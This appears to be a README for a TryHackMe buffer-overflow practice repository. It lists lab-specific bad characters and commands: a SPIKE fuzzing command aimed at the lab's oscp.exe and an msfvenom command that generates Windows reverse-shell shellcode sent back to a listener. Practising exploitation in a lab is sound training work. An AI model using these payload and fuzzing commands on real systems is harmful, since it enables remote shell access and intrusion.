# THM_Buffer-Overflow-Prep

Each folder numbered from 1 to x contains the scripts from fuzzing to the stage of creating a final POC 

Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverflowprep

**command used for shellcode generation to Fit with scripts**

     msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "\<badChars-specific-to-overflow\>" EXITFUNC=thread -v shellcode

**command to be used with spike scripts to find payload triggering the crash**

generic_send_tcp <target-ip> 1337{this port is specific to the oscp.exe} fuzz.spk 0 0
    
 More on spike:--> https://resources.infosecinstitute.com/topic/intro-to-fuzzing/
    
# OVERFLOW 1

**Bad Chars:--> \x00\x07\x2e\xa0**


# OVERFLOW 2

**Bad Chars:--> \x00\x23\x3c\x83\xa0\xba**

# OVERFLOW 3

**Bad Chars:--> \x00\x11\x40\x5f\xb8\xee**


# NOTE

  *The badChars scripts present in each overflow directory contains a badChars variable from which also badchars specific to the overflow have been eliminated* 
  
 **scripts are to be run with python but you may adjust some encoding in place to make them work with python3** 
 
**Other Overflows will be added as I do them**
